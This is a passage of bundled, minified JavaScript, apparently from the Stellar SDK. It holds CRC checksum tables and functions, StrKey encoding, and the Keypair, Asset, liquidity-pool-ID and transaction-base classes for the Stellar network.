    return j
});
let TABLE$3 = [0, 4489, 8978, 12955, 17956, 22445, 25910, 29887, 35912, 40385, 44890, 48851, 51820, 56293, 59774, 63735, 4225, 264, 13203, 8730, 22181, 18220, 30135, 25662, 40137, 36160, 49115, 44626, 56045, 52068, 63999, 59510, 8450, 12427, 528, 5017, 26406, 30383, 17460, 21949, 44362, 48323, 36440, 40913, 60270, 64231, 51324, 55797, 12675, 8202, 4753, 792, 30631, 26158, 21685, 17724, 48587, 44098, 40665, 36688, 64495, 60006, 55549, 51572, 16900, 21389, 24854, 28831, 1056, 5545, 10034, 14011, 52812, 57285, 60766, 64727, 34920, 39393, 43898, 47859, 21125, 17164, 29079, 24606, 5281, 1320, 14259, 9786, 57037, 53060, 64991, 60502, 39145, 35168, 48123, 43634, 25350, 29327, 16404, 20893, 9506, 13483, 1584, 6073, 61262, 65223, 52316, 56789, 43370, 47331, 35448, 39921, 29575, 25102, 20629, 16668, 13731, 9258, 5809, 1848, 65487, 60998, 56541, 52564, 47595, 43106, 39673, 35696, 33800, 38273, 42778, 46739, 49708, 54181, 57662, 61623, 2112, 6601, 11090, 15067, 20068, 24557, 28022, 31999, 38025, 34048, 47003, 42514, 53933, 49956, 61887, 57398, 6337, 2376, 15315, 10842, 24293, 20332, 32247, 27774, 42250, 46211, 34328, 38801, 58158, 62119, 49212, 53685, 10562, 14539, 2640, 7129, 28518, 32495, 19572, 24061, 46475, 41986, 38553, 34576, 62383, 57894, 53437, 49460, 14787, 10314, 6865, 2904, 32743, 28270, 23797, 19836, 50700, 55173, 58654, 62615, 32808, 37281, 41786, 45747, 19012, 23501, 26966, 30943, 3168, 7657, 12146, 16123, 54925, 50948, 62879, 58390, 37033, 33056, 46011, 41522, 23237, 19276, 31191, 26718, 7393, 3432, 16371, 11898, 59150, 63111, 50204, 54677, 41258, 45219, 33336, 37809, 27462, 31439, 18516, 23005, 11618, 15595, 3696, 8185, 63375, 58886, 54429, 50452, 45483, 40994, 37561, 33584, 31687, 27214, 22741, 18780, 15843, 11370, 7921, 3960];
typeof Int32Array < "u" && (TABLE$3 = new Int32Array(TABLE$3));
const crc16kermit = defineCrc("kermit", function(_, M) {
    Buffer$1.isBuffer(_) || (_ = createBuffer(_));
    let j = typeof M < "u" ? ~~M : 0;
    for (let O = 0; O < _.length; O++) {
        const x = _[O];
        j = (TABLE$3[(j ^ x) & 255] ^ j >> 8) & 65535
    }
    return j
});
let TABLE$2 = [0, 8801531, 9098509, 825846, 9692897, 1419802, 1651692, 10452759, 10584377, 2608578, 2839604, 11344079, 3303384, 11807523, 12104405, 4128302, 12930697, 4391538, 5217156, 13227903, 5679208, 13690003, 14450021, 5910942, 6606768, 14844747, 15604413, 6837830, 16197969, 7431594, 8256604, 16494759, 840169, 9084178, 8783076, 18463, 10434312, 1670131, 1434117, 9678590, 11358416, 2825259, 2590173, 10602790, 4109873, 12122826, 11821884, 3289031, 13213536, 5231515, 4409965, 12912278, 5929345, 14431610, 13675660, 5693559, 6823513, 15618722, 14863188, 6588335, 16513208, 8238147, 7417269, 16212302, 1680338, 10481449, 9664223, 1391140, 9061683, 788936, 36926, 8838341, 12067563, 4091408, 3340262, 11844381, 2868234, 11372785, 10555655, 2579964, 14478683, 5939616, 5650518, 13661357, 5180346, 13190977, 12967607, 4428364, 8219746, 16457881, 16234863, 7468436, 15633027, 6866552, 6578062, 14816117, 1405499, 9649856, 10463030, 1698765, 8819930, 55329, 803287, 9047340, 11858690, 3325945, 4072975, 12086004, 2561507, 10574104, 11387118, 2853909, 13647026, 5664841, 5958079, 14460228, 4446803, 12949160, 13176670, 5194661, 7454091, 16249200, 16476294, 8201341, 14834538, 6559633, 6852199, 15647388, 3360676, 11864927, 12161705, 4185682, 10527045, 2551230, 2782280, 11286707, 9619101, 1346150, 1577872, 10379115, 73852, 8875143, 9172337, 899466, 16124205, 7357910, 8182816, 16421083, 6680524, 14918455, 15678145, 6911546, 5736468, 13747439, 14507289, 5968354, 12873461, 4334094, 5159928, 13170435, 4167245, 12180150, 11879232, 3346363, 11301036, 2767959, 2532769, 10545498, 10360692, 1596303, 1360505, 9604738, 913813, 9157998, 8856728, 92259, 16439492, 8164415, 7343561, 16138546, 6897189, 15692510, 14936872, 6662099, 5986813, 14488838, 13733104, 5750795, 13156124, 5174247, 4352529, 12855018, 2810998, 11315341, 10498427, 2522496, 12124823, 4148844, 3397530, 11901793, 9135439, 862644, 110658, 8912057, 1606574, 10407765, 9590435, 1317464, 15706879, 6940164, 6651890, 14889737, 8145950, 16384229, 16161043, 7394792, 5123014, 13133629, 12910283, 4370992, 14535975, 5997020, 5707818, 13718737, 2504095, 10516836, 11329682, 2796649, 11916158, 3383173, 4130419, 12143240, 8893606, 129117, 876971, 9121104, 1331783, 9576124, 10389322, 1625009, 14908182, 6633453, 6925851, 15721184, 7380471, 16175372, 16402682, 8127489, 4389423, 12891860, 13119266, 5137369, 13704398, 5722165, 6015427, 14517560];
typeof Int32Array < "u" && (TABLE$2 = new Int32Array(TABLE$2));
const crc24 = defineCrc("crc-24", function(_, M) {
    Buffer$1.isBuffer(_) || (_ = createBuffer(_));
    let j = typeof M < "u" ? ~~M : 11994318;
    for (let O = 0; O < _.length; O++) {
        const x = _[O];
        j = (TABLE$2[(j >> 16 ^ x) & 255] ^ j << 8) & 16777215
    }
    return j
});
let TABLE$1 = [0, 1996959894, 3993919788, 2567524794, 124634137, 1886057615, 3915621685, 2657392035, 249268274, 2044508324, 3772115230, 2547177864, 162941995, 2125561021, 3887607047, 2428444049, 498536548, 1789927666, 4089016648, 2227061214, 450548861, 1843258603, 4107580753, 2211677639, 325883990, 1684777152, 4251122042, 2321926636, 335633487, 1661365465, 4195302755, 2366115317, 997073096, 1281953886, 3579855332, 2724688242, 1006888145, 1258607687, 3524101629, 2768942443, 901097722, 1119000684, 3686517206, 2898065728, 853044451, 1172266101, 3705015759, 2882616665, 651767980, 1373503546, 3369554304, 3218104598, 565507253, 1454621731, 3485111705, 3099436303, 671266974, 1594198024, 3322730930, 2970347812, 795835527, 1483230225, 3244367275, 3060149565, 1994146192, 31158534, 2563907772, 4023717930, 1907459465, 112637215, 2680153253, 3904427059, 2013776290, 251722036, 2517215374, 3775830040, 2137656763, 141376813, 2439277719, 3865271297, 1802195444, 476864866, 2238001368, 4066508878, 1812370925, 453092731, 2181625025, 4111451223, 1706088902, 314042704, 2344532202, 4240017532, 1658658271, 366619977, 2362670323, 4224994405, 1303535960, 984961486, 2747007092, 3569037538, 1256170817, 1037604311, 2765210733, 3554079995, 1131014506, 879679996, 2909243462, 3663771856, 1141124467, 855842277, 2852801631, 3708648649, 1342533948, 654459306, 3188396048, 3373015174, 1466479909, 544179635, 3110523913, 3462522015, 1591671054, 702138776, 2966460450, 3352799412, 1504918807, 783551873, 3082640443, 3233442989, 3988292384, 2596254646, 62317068, 1957810842, 3939845945, 2647816111, 81470997, 1943803523, 3814918930, 2489596804, 225274430, 2053790376, 3826175755, 2466906013, 167816743, 2097651377, 4027552580, 2265490386, 503444072, 1762050814, 4150417245, 2154129355, 426522225, 1852507879, 4275313526, 2312317920, 282753626, 1742555852, 4189708143, 2394877945, 397917763, 1622183637, 3604390888, 2714866558, 953729732, 1340076626, 3518719985, 2797360999, 1068828381, 1219638859, 3624741850, 2936675148, 906185462, 1090812512, 3747672003, 2825379669, 829329135, 1181335161, 3412177804, 3160834842, 628085408, 1382605366, 3423369109, 3138078467, 570562233, 1426400815, 3317316542, 2998733608, 733239954, 1555261956, 3268935591, 3050360625, 752459403, 1541320221, 2607071920, 3965973030, 1969922972, 40735498, 2617837225, 3943577151, 1913087877, 83908371, 2512341634, 3803740692, 2075208622, 213261112, 2463272603, 3855990285, 2094854071, 198958881, 2262029012, 4057260610, 1759359992, 534414190, 2176718541, 4139329115, 1873836001, 414664567, 2282248934, 4279200368, 1711684554, 285281116, 2405801727, 4167216745, 1634467795, 376229701, 2685067896, 3608007406, 1308918612, 956543938, 2808555105, 3495958263, 1231636301, 1047427035, 2932959818, 3654703836, 1088359270, 936918e3, 2847714899, 3736837829, 1202900863, 817233897, 3183342108, 3401237130, 1404277552, 615818150, 3134207493, 3453421203, 1423857449, 601450431, 3009837614, 3294710456, 1567103746, 711928724, 3020668471, 3272380065, 1510334235, 755167117];
typeof Int32Array < "u" && (TABLE$1 = new Int32Array(TABLE$1));
const crc32 = defineCrc("crc-32", function(_, M) {
    Buffer$1.isBuffer(_) || (_ = createBuffer(_));
    let j = M === 0 ? 0 : ~~M ^ -1;
    for (let O = 0; O < _.length; O++) {
        const x = _[O];
        j = TABLE$1[(j ^ x) & 255] ^ j >>> 8
    }
    return j ^ -1
});
let TABLE = [0, 1996959894, 3993919788, 2567524794, 124634137, 1886057615, 3915621685, 2657392035, 249268274, 2044508324, 3772115230, 2547177864, 162941995, 2125561021, 3887607047, 2428444049, 498536548, 1789927666, 4089016648, 2227061214, 450548861, 1843258603, 4107580753, 2211677639, 325883990, 1684777152, 4251122042, 2321926636, 335633487, 1661365465, 4195302755, 2366115317, 997073096, 1281953886, 3579855332, 2724688242, 1006888145, 1258607687, 3524101629, 2768942443, 901097722, 1119000684, 3686517206, 2898065728, 853044451, 1172266101, 3705015759, 2882616665, 651767980, 1373503546, 3369554304, 3218104598, 565507253, 1454621731, 3485111705, 3099436303, 671266974, 1594198024, 3322730930, 2970347812, 795835527, 1483230225, 3244367275, 3060149565, 1994146192, 31158534, 2563907772, 4023717930, 1907459465, 112637215, 2680153253, 3904427059, 2013776290, 251722036, 2517215374, 3775830040, 2137656763, 141376813, 2439277719, 3865271297, 1802195444, 476864866, 2238001368, 4066508878, 1812370925, 453092731, 2181625025, 4111451223, 1706088902, 314042704, 2344532202, 4240017532, 1658658271, 366619977, 2362670323, 4224994405, 1303535960, 984961486, 2747007092, 3569037538, 1256170817, 1037604311, 2765210733, 3554079995, 1131014506, 879679996, 2909243462, 3663771856, 1141124467, 855842277, 2852801631, 3708648649, 1342533948, 654459306, 3188396048, 3373015174, 1466479909, 544179635, 3110523913, 3462522015, 1591671054, 702138776, 2966460450, 3352799412, 1504918807, 783551873, 3082640443, 3233442989, 3988292384, 2596254646, 62317068, 1957810842, 3939845945, 2647816111, 81470997, 1943803523, 3814918930, 2489596804, 225274430, 2053790376, 3826175755, 2466906013, 167816743, 2097651377, 4027552580, 2265490386, 503444072, 1762050814, 4150417245, 2154129355, 426522225, 1852507879, 4275313526, 2312317920, 282753626, 1742555852, 4189708143, 2394877945, 397917763, 1622183637, 3604390888, 2714866558, 953729732, 1340076626, 3518719985, 2797360999, 1068828381, 1219638859, 3624741850, 2936675148, 906185462, 1090812512, 3747672003, 2825379669, 829329135, 1181335161, 3412177804, 3160834842, 628085408, 1382605366, 3423369109, 3138078467, 570562233, 1426400815, 3317316542, 2998733608, 733239954, 1555261956, 3268935591, 3050360625, 752459403, 1541320221, 2607071920, 3965973030, 1969922972, 40735498, 2617837225, 3943577151, 1913087877, 83908371, 2512341634, 3803740692, 2075208622, 213261112, 2463272603, 3855990285, 2094854071, 198958881, 2262029012, 4057260610, 1759359992, 534414190, 2176718541, 4139329115, 1873836001, 414664567, 2282248934, 4279200368, 1711684554, 285281116, 2405801727, 4167216745, 1634467795, 376229701, 2685067896, 3608007406, 1308918612, 956543938, 2808555105, 3495958263, 1231636301, 1047427035, 2932959818, 3654703836, 1088359270, 936918e3, 2847714899, 3736837829, 1202900863, 817233897, 3183342108, 3401237130, 1404277552, 615818150, 3134207493, 3453421203, 1423857449, 601450431, 3009837614, 3294710456, 1567103746, 711928724, 3020668471, 3272380065, 1510334235, 755167117];
typeof Int32Array < "u" && (TABLE = new Int32Array(TABLE));
const crcjam = defineCrc("jam", function(_, M=-1) {
    Buffer$1.isBuffer(_) || (_ = createBuffer(_));
    let j = M === 0 ? 0 : ~~M;
    for (let O = 0; O < _.length; O++) {
        const x = _[O];
        j = TABLE[(j ^ x) & 255] ^ j >>> 8
    }
    return j
})
  , index = {
    crc1,
    crc8,
    crc81wire,
    crc16,
    crc16ccitt,
    crc16modbus,
    crc16xmodem,
    crc16kermit,
    crc24,
    crc32,
    crcjam
}
  , crc = Object.freeze(Object.defineProperty({
    __proto__: null,
    crc1,
    crc16,
    crc16ccitt,
    crc16kermit,
    crc16modbus,
    crc16xmodem,
    crc24,
    crc32,
    crc8,
    crc81wire,
    crcjam,
    default: index
}, Symbol.toStringTag, {
    value: "Module"
}))
  , require$$1$2 = getAugmentedNamespace(crc);
var checksum$1 = {}, hasRequiredChecksum$1;
function requireChecksum$1() {
    if (hasRequiredChecksum$1)
        return checksum$1;
    hasRequiredChecksum$1 = 1,
    Object.defineProperty(checksum$1, "__esModule", {
        value: !0
    }),
    checksum$1.verifyChecksum = _;
    function _(M, j) {
        if (M.length !== j.length)
            return !1;
        if (M.length === 0)
            return !0;
        for (var O = 0; O < M.length; O += 1)
            if (M[O] !== j[O])
                return !1;
        return !0
    }
    return checksum$1
}
var hasRequiredStrkey$1;
function requireStrkey$1() {
    if (hasRequiredStrkey$1)
        return strkey$1;
    hasRequiredStrkey$1 = 1,
    Object.defineProperty(strkey$1, "__esModule", {
        value: !0
    }),
    strkey$1.StrKey = void 0;
    var _ = function() {
        function he(pe, ye) {
            for (var be = 0; be < ye.length; be++) {
                var xe = ye[be];
                xe.enumerable = xe.enumerable || !1,
                xe.configurable = !0,
                "value"in xe && (xe.writable = !0),
                Object.defineProperty(pe, xe.key, xe)
            }
        }
        return function(pe, ye, be) {
            return ye && he(pe.prototype, ye),
            be && he(pe, be),
            pe
        }
    }();
    strkey$1.decodeCheck = oe,
    strkey$1.encodeCheck = ue;
    var M = requireBase32()
      , j = Q(M)
      , O = require$$1$2
      , x = Q(O)
      , w = requireIsUndefined()
      , b = Q(w)
      , X = requireIsNull()
      , Y = Q(X)
      , F = requireIsString()
      , V = Q(F)
      , K = requireChecksum$1();
    function Q(he) {
        return he && he.__esModule ? he : {
            default: he
        }
    }
    function ee(he, pe) {
        if (!(he instanceof pe))
            throw new TypeError("Cannot call a class as a function")
    }
    var ae = {
        ed25519PublicKey: 48,
        ed25519SecretSeed: 144,
        med25519PublicKey: 96,
        preAuthTx: 152,
        sha256Hash: 184
    };
    strkey$1.StrKey = function() {
        function he() {
            ee(this, he)
        }
        return _(he, null, [{
            key: "encodeEd25519PublicKey",
            value: function(ye) {
                return ue("ed25519PublicKey", ye)
            }
        }, {
            key: "decodeEd25519PublicKey",
            value: function(ye) {
                return oe("ed25519PublicKey", ye)
            }
        }, {
            key: "isValidEd25519PublicKey",
            value: function(ye) {
                return ne("ed25519PublicKey", ye)
            }
        }, {
            key: "encodeEd25519SecretSeed",
            value: function(ye) {
                return ue("ed25519SecretSeed", ye)
            }
        }, {
            key: "decodeEd25519SecretSeed",
            value: function(ye) {
                return oe("ed25519SecretSeed", ye)
            }
        }, {
            key: "isValidEd25519SecretSeed",
            value: function(ye) {
                return ne("ed25519SecretSeed", ye)
            }
        }, {
            key: "encodeMed25519PublicKey",
            value: function(ye) {
                return ue("med25519PublicKey", ye)
            }
        }, {
            key: "decodeMed25519PublicKey",
            value: function(ye) {
                return oe("med25519PublicKey", ye)
            }
        }, {
            key: "isValidMed25519PublicKey",
            value: function(ye) {
                return ne("med25519PublicKey", ye)
            }
        }, {
            key: "encodePreAuthTx",
            value: function(ye) {
                return ue("preAuthTx", ye)
            }
        }, {
            key: "decodePreAuthTx",
            value: function(ye) {
                return oe("preAuthTx", ye)
            }
        }, {
            key: "encodeSha256Hash",
            value: function(ye) {
                return ue("sha256Hash", ye)
            }
        }, {
            key: "decodeSha256Hash",
            value: function(ye) {
                return oe("sha256Hash", ye)
            }
        }]),
        he
    }();
    function ne(he, pe) {
        if (pe && pe.length !== 56 && pe.length !== 69)
            return !1;
        try {
            var ye = oe(he, pe);
            if (ye.length !== 32 && ye.length !== 40)
                return !1
        } catch {
            return !1
        }
        return !0
    }
    function oe(he, pe) {
        if (!(0,
        V.default)(pe))
            throw new TypeError("encoded argument must be of type String");
        var ye = j.default.decode(pe)
          , be = ye[0]
          , xe = ye.slice(0, -2)
          , Ae = xe.slice(1)
          , Ee = ye.slice(-2);
        if (pe !== j.default.encode(ye))
            throw new Error("invalid encoded string");
        var Be = ae[he];
        if ((0,
        b.default)(Be))
            throw new Error(he + " is not a valid version byte name. " + ("Expected one of " + Object.keys(ae).join(", ")));
        if (be !== Be)
            throw new Error("invalid version byte. expected " + Be + ", got " + be);
        var ce = fe(xe);
        if (!(0,
        K.verifyChecksum)(ce, Ee))
            throw new Error("invalid checksum");
        return Buffer.from(Ae)
    }
    function ue(he, pe) {
        if ((0,
        Y.default)(pe) || (0,
        b.default)(pe))
            throw new Error("cannot encode null data");
        var ye = ae[he];
        if ((0,
        b.default)(ye))
            throw new Error(he + " is not a valid version byte name. " + ("Expected one of " + Object.keys(ae).join(", ")));
        pe = Buffer.from(pe);
        var be = Buffer.from([ye])
          , xe = Buffer.concat([be, pe])
          , Ae = fe(xe)
          , Ee = Buffer.concat([xe, Ae]);
        return j.default.encode(Ee)
    }
    function fe(he) {
        var pe = Buffer.alloc(2);
        return pe.writeUInt16LE(x.default.crc16xmodem(he), 0),
        pe
    }
    return strkey$1
}
var hasRequiredKeypair$1;
function requireKeypair$1() {
    if (hasRequiredKeypair$1)
        return keypair$1;
    hasRequiredKeypair$1 = 1,
    Object.defineProperty(keypair$1, "__esModule", {
        value: !0
    }),
    keypair$1.Keypair = void 0;
    var _ = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(ne) {
        return typeof ne
    }
    : function(ne) {
        return ne && typeof Symbol == "function" && ne.constructor === Symbol && ne !== Symbol.prototype ? "symbol" : typeof ne
    }
      , M = function() {
        function ne(oe, ue) {
            for (var fe = 0; fe < ue.length; fe++) {
                var he = ue[fe];
                he.enumerable = he.enumerable || !1,
                he.configurable = !0,
                "value"in he && (he.writable = !0),
                Object.defineProperty(oe, he.key, he)
            }
        }
        return function(oe, ue, fe) {
            return ue && ne(oe.prototype, ue),
            fe && ne(oe, fe),
            oe
        }
    }()
      , j = requireNaclFast()
      , O = ee(j)
      , x = requireIsUndefined()
      , w = ee(x)
      , b = requireIsString()
      , X = ee(b)
      , Y = requireSigning$1()
      , F = requireStrkey$1()
      , V = requireHashing$1()
      , K = requireStellarXdr_generated()
      , Q = ee(K);
    function ee(ne) {
        return ne && ne.__esModule ? ne : {
            default: ne
        }
    }
    function ae(ne, oe) {
        if (!(ne instanceof oe))
            throw new TypeError("Cannot call a class as a function")
    }
    return keypair$1.Keypair = function() {
        function ne(oe) {
            if (ae(this, ne),
            oe.type !== "ed25519")
                throw new Error("Invalid keys type");
            if (this.type = oe.type,
            oe.secretKey) {
                if (oe.secretKey = Buffer.from(oe.secretKey),
                oe.secretKey.length !== 32)
                    throw new Error("secretKey length is invalid");
                if (this._secretSeed = oe.secretKey,
                this._publicKey = (0,
                Y.generate)(oe.secretKey),
                this._secretKey = Buffer.concat([oe.secretKey, this._publicKey]),
                oe.publicKey && !this._publicKey.equals(Buffer.from(oe.publicKey)))
                    throw new Error("secretKey does not match publicKey")
            } else if (this._publicKey = Buffer.from(oe.publicKey),
            this._publicKey.length !== 32)
                throw new Error("publicKey length is invalid")
        }
        return M(ne, [{
            key: "xdrAccountId",
            value: function() {
                return new Q.default.AccountId.publicKeyTypeEd25519(this._publicKey)
            }
        }, {
            key: "xdrPublicKey",
            value: function() {
                return new Q.default.PublicKey.publicKeyTypeEd25519(this._publicKey)
            }
        }, {
            key: "xdrMuxedAccount",
            value: function(ue) {
                if (!(0,
                w.default)(ue)) {
                    if (!(0,
                    X.default)(ue))
                        throw new TypeError("expected string for ID, got " + (typeof ue > "u" ? "undefined" : _(ue)));
                    return Q.default.MuxedAccount.keyTypeMuxedEd25519(new Q.default.MuxedAccountMed25519({
                        id: Q.default.Uint64.fromString(ue),
                        ed25519: this._publicKey
                    }))
                }
                return new Q.default.MuxedAccount.keyTypeEd25519(this._publicKey)
            }
        }, {
            key: "rawPublicKey",
            value: function() {
                return this._publicKey
            }
        }, {
            key: "signatureHint",
            value: function() {
                var ue = this.xdrAccountId().toXDR();
                return ue.slice(ue.length - 4)
            }
        }, {
            key: "publicKey",
            value: function() {
                return F.StrKey.encodeEd25519PublicKey(this._publicKey)
            }
        }, {
            key: "secret",
            value: function() {
                if (!this._secretSeed)
                    throw new Error("no secret key available");
                if (this.type === "ed25519")
                    return F.StrKey.encodeEd25519SecretSeed(this._secretSeed);
                throw new Error("Invalid Keypair type")
            }
        }, {
            key: "rawSecretKey",
            value: function() {
                return this._secretSeed
            }
        }, {
            key: "canSign",
            value: function() {
                return !!this._secretKey
            }
        }, {
            key: "sign",
            value: function(ue) {
                if (!this.canSign())
                    throw new Error("cannot sign: no secret key available");
                return (0,
                Y.sign)(ue, this._secretKey)
            }
        }, {
            key: "verify",
            value: function(ue, fe) {
                return (0,
                Y.verify)(ue, fe, this._publicKey)
            }
        }, {
            key: "signDecorated",
            value: function(ue) {
                var fe = this.sign(ue)
                  , he = this.signatureHint();
                return new Q.default.DecoratedSignature({
                    hint: he,
                    signature: fe
                })
            }
        }], [{
            key: "fromSecret",
            value: function(ue) {
                var fe = F.StrKey.decodeEd25519SecretSeed(ue);
                return this.fromRawEd25519Seed(fe)
            }
        }, {
            key: "fromRawEd25519Seed",
            value: function(ue) {
                return new this({
                    type: "ed25519",
                    secretKey: ue
                })
            }
        }, {
            key: "master",
            value: function(ue) {
                if (!ue)
                    throw new Error("No network selected. Please pass a network argument, e.g. `Keypair.master(Networks.PUBLIC)`.");
                return this.fromRawEd25519Seed((0,
                V.hash)(ue))
            }
        }, {
            key: "fromPublicKey",
            value: function(ue) {
                if (ue = F.StrKey.decodeEd25519PublicKey(ue),
                ue.length !== 32)
                    throw new Error("Invalid Stellar public key");
                return new this({
                    type: "ed25519",
                    publicKey: ue
                })
            }
        }, {
            key: "random",
            value: function() {
                var ue = O.default.randomBytes(32);
                return this.fromRawEd25519Seed(ue)
            }
        }]),
        ne
    }(),
    keypair$1
}
var hasRequiredAsset$1;
function requireAsset$1() {
    if (hasRequiredAsset$1)
        return asset$1;
    hasRequiredAsset$1 = 1,
    Object.defineProperty(asset$1, "__esModule", {
        value: !0
    }),
    asset$1.Asset = void 0;
    var _ = function() {
        function ee(ae, ne) {
            for (var oe = 0; oe < ne.length; oe++) {
                var ue = ne[oe];
                ue.enumerable = ue.enumerable || !1,
                ue.configurable = !0,
                "value"in ue && (ue.writable = !0),
                Object.defineProperty(ae, ue.key, ue)
            }
        }
        return function(ae, ne, oe) {
            return ne && ee(ae.prototype, ne),
            oe && ee(ae, oe),
            ae
        }
    }()
      , M = requireClone()
      , j = K(M)
      , O = requirePadEnd()
      , x = K(O)
      , w = requireTrimEnd()
      , b = K(w)
      , X = requireStellarXdr_generated()
      , Y = K(X)
      , F = requireKeypair$1()
      , V = requireStrkey$1();
    function K(ee) {
        return ee && ee.__esModule ? ee : {
            default: ee
        }
    }
    function Q(ee, ae) {
        if (!(ee instanceof ae))
            throw new TypeError("Cannot call a class as a function")
    }
    return asset$1.Asset = function() {
        function ee(ae, ne) {
            if (Q(this, ee),
            !/^[a-zA-Z0-9]{1,12}$/.test(ae))
                throw new Error("Asset code is invalid (maximum alphanumeric, 12 characters at max)");
            if (String(ae).toLowerCase() !== "xlm" && !ne)
                throw new Error("Issuer cannot be null");
            if (ne && !V.StrKey.isValidEd25519PublicKey(ne))
                throw new Error("Issuer is invalid");
            this.code = ae,
            this.issuer = ne
        }
        return _(ee, [{
            key: "toXDRObject",
            value: function() {
                return this._toXDRObject(Y.default.Asset)
            }
        }, {
            key: "toChangeTrustXDRObject",
            value: function() {
                return this._toXDRObject(Y.default.ChangeTrustAsset)
            }
        }, {
            key: "toTrustLineXDRObject",
            value: function() {
                return this._toXDRObject(Y.default.TrustLineAsset)
            }
        }, {
            key: "_toXDRObject",
            value: function() {
                var ne = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : Y.default.Asset;
                if (this.isNative())
                    return ne.assetTypeNative();
                var oe = void 0
                  , ue = void 0;
                this.code.length <= 4 ? (oe = Y.default.AlphaNum4,
                ue = "assetTypeCreditAlphanum4") : (oe = Y.default.AlphaNum12,
                ue = "assetTypeCreditAlphanum12");
                var fe = this.code.length <= 4 ? 4 : 12
                  , he = (0,
                x.default)(this.code, fe, "\0")
                  , pe = new oe({
                    assetCode: he,
                    issuer: F.Keypair.fromPublicKey(this.issuer).xdrAccountId()
                });
                return new ne(ue,pe)
            }
        }, {
            key: "getCode",
            value: function() {
                return (0,
                j.default)(this.code)
            }
        }, {
            key: "getIssuer",
            value: function() {
                return (0,
                j.default)(this.issuer)
            }
        }, {
            key: "getAssetType",
            value: function() {
                return this.isNative() ? "native" : this.code.length >= 1 && this.code.length <= 4 ? "credit_alphanum4" : this.code.length >= 5 && this.code.length <= 12 ? "credit_alphanum12" : null
            }
        }, {
            key: "isNative",
            value: function() {
                return !this.issuer
            }
        }, {
            key: "equals",
            value: function(ne) {
                return this.code === ne.getCode() && this.issuer === ne.getIssuer()
            }
        }, {
            key: "toString",
            value: function() {
                return this.isNative() ? "native" : this.getCode() + ":" + this.getIssuer()
            }
        }], [{
            key: "native",
            value: function() {
                return new ee("XLM")
            }
        }, {
            key: "fromOperation",
            value: function(ne) {
                var oe = void 0
                  , ue = void 0
                  , fe = void 0;
                switch (ne.switch()) {
                case Y.default.AssetType.assetTypeNative():
                    return this.native();
                case Y.default.AssetType.assetTypeCreditAlphanum4():
                    oe = ne.alphaNum4();
                case Y.default.AssetType.assetTypeCreditAlphanum12():
                    return oe = oe || ne.alphaNum12(),
                    fe = V.StrKey.encodeEd25519PublicKey(oe.issuer().ed25519()),
                    ue = (0,
                    b.default)(oe.assetCode(), "\0"),
                    new this(ue,fe);
                default:
                    throw new Error("Invalid asset type: " + ne.switch().name)
                }
            }
        }, {
            key: "compare",
            value: function(ne, oe) {
                if (!ne || !(ne instanceof ee))
                    throw new Error("assetA is invalid");
                if (!oe || !(oe instanceof ee))
                    throw new Error("assetB is invalid");
                if (ne.equals(oe))
                    return 0;
                switch (ne.getAssetType()) {
                case "native":
                    return -1;
                case "credit_alphanum4":
                    if (oe.getAssetType() === "native")
                        return 1;
                    if (oe.getAssetType() === "credit_alphanum12")
                        return -1;
                    break;
                case "credit_alphanum12":
                    if (oe.getAssetType() !== "credit_alphanum12")
                        return 1;
                    break;
                default:
                    throw new Error("Unexpected asset type")
                }
                var ue = ne.getCode().localeCompare(oe.getCode());
                return ue !== 0 ? ue : ne.getIssuer().localeCompare(oe.getIssuer())
            }
        }]),
        ee
    }(),
    asset$1
}
var hasRequiredGet_liquidity_pool_id$1;
function requireGet_liquidity_pool_id$1() {
    if (hasRequiredGet_liquidity_pool_id$1)
        return get_liquidity_pool_id$1;
    hasRequiredGet_liquidity_pool_id$1 = 1,
    Object.defineProperty(get_liquidity_pool_id$1, "__esModule", {
        value: !0
    }),
    get_liquidity_pool_id$1.LiquidityPoolFeeV18 = void 0,
    get_liquidity_pool_id$1.getLiquidityPoolId = b;
    var _ = requireStellarXdr_generated()
      , M = x(_)
      , j = requireAsset$1()
      , O = requireHashing$1();
    function x(X) {
        return X && X.__esModule ? X : {
            default: X
        }
    }
    var w = get_liquidity_pool_id$1.LiquidityPoolFeeV18 = 30;
    function b(X) {
        var Y = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
        if (X !== "constant_product")
            throw new Error("liquidityPoolType is invalid");
        var F = Y.assetA
          , V = Y.assetB
          , K = Y.fee;
        if (!F || !(F instanceof j.Asset))
            throw new Error("assetA is invalid");
        if (!V || !(V instanceof j.Asset))
            throw new Error("assetB is invalid");
        if (!K || K !== w)
            throw new Error("fee is invalid");
        if (j.Asset.compare(F, V) !== -1)
            throw new Error("Assets are not in lexicographic order");
        var Q = M.default.LiquidityPoolType.liquidityPoolConstantProduct().toXDR()
          , ee = new M.default.LiquidityPoolConstantProductParameters({
            assetA: F.toXDRObject(),
            assetB: V.toXDRObject(),
            fee: K
        }).toXDR()
          , ae = Buffer.concat([Q, ee]);
        return (0,
        O.hash)(ae)
    }
    return get_liquidity_pool_id$1
}
var transaction_base$1 = {}, hasRequiredTransaction_base$1;
function requireTransaction_base$1() {
    if (hasRequiredTransaction_base$1)
        return transaction_base$1;
    hasRequiredTransaction_base$1 = 1,
    Object.defineProperty(transaction_base$1, "__esModule", {
        value: !0
    }),
    transaction_base$1.TransactionBase = void 0;
    var _ = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(Y) {
        return typeof Y
    }
    : function(Y) {
        return Y && typeof Symbol == "function" && Y.constructor === Symbol && Y !== Symbol.prototype ? "symbol" : typeof Y
    }
      , M = function() {
        function Y(F, V) {
            for (var K = 0; K < V.length; K++) {
                var Q = V[K];
                Q.enumerable = Q.enumerable || !1,
                Q.configurable = !0,
                "value"in Q && (Q.writable = !0),
                Object.defineProperty(F, Q.key, Q)
            }
        }
        return function(F, V, K) {
            return V && Y(F.prototype, V),
            K && Y(F, K),
            F
        }
    }()
      , j = requireStellarXdr_generated()
      , O = b(j)
      , x = requireHashing$1()
      , w = requireKeypair$1();
    function b(Y) {
        return Y && Y.__esModule ? Y : {
            default: Y
        }
    }
    function X(Y, F) {
        if (!(Y instanceof F))
            throw new TypeError("Cannot call a class as a function")
    }
    return transaction_base$1.TransactionBase = function() {
        function Y(F, V, K, Q) {
            if (X(this, Y),
            typeof Q != "string")
                throw new Error("Invalid passphrase provided to Transaction: expected a string but got a " + (typeof Q > "u" ? "undefined" : _(Q)));
            this._networkPassphrase = Q,
            this._tx = F,
            this._signatures = V,
            this._fee = K
        }
        return M(Y, [{
            key: "sign",
            value: function() {
